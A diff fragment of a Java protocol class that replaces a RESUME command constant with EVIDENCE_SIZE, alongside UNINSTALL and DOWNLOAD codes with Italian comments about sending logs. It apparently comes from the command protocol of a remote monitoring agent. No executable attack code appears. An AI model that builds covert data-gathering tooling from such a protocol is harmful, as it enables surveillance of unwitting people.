@@ -45,8 +45,7 @@ public final class Proto {
 	public static final int UNINSTALL = 0xa; // Uninstallati
 
 	/** The Constant RESUME. */
-	public static final int RESUME = 0xb; // RESUME,nome,# rimandami il
-	// log "nome" a partire dal byte
+	public static final int EVIDENCE_SIZE = 0xb; // Evidence size
 
 	/** The Constant DOWNLOAD. */
 	public static final int DOWNLOAD = 0xc; // DOWNLOAD,nome: mandami il
